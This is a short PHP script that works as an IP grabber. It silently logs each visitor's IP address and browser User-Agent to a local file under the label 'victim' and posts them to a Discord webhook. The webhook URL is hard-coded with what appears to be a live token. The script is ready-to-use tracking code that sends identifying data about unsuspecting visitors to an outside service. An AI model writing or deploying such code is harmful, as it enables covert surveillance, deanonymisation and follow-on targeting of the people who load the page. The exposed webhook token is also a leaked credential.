<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
}

$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

// Save data to a file
$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fclose($fp);

// Send data to a Discord webhook
$webhookURL = "https://discord.com/api/webhooks/1314916680354365521/CuqeqAucg5UNUkXroMmw0mi1vKDa-Hsd2uCW-lk0ysvRcL3DWRZCHLkql9Q5t7rCwW8R"; // Replace with your Discord webhook URL

$data = [
    "content" => "**New Visitor Logged:**\n" .
        "**IP Address:** " . $ipaddress .
        "**User-Agent:** " . $browser
];

$options = [
    "http" => [
        "header" => "Content-type: application/json\r\n",
        "method" => "POST",
        "content" => json_encode($data),
    ]
];

$context = stream_context_create($options);
$response = file_get_contents($webhookURL, false, $context);
?>
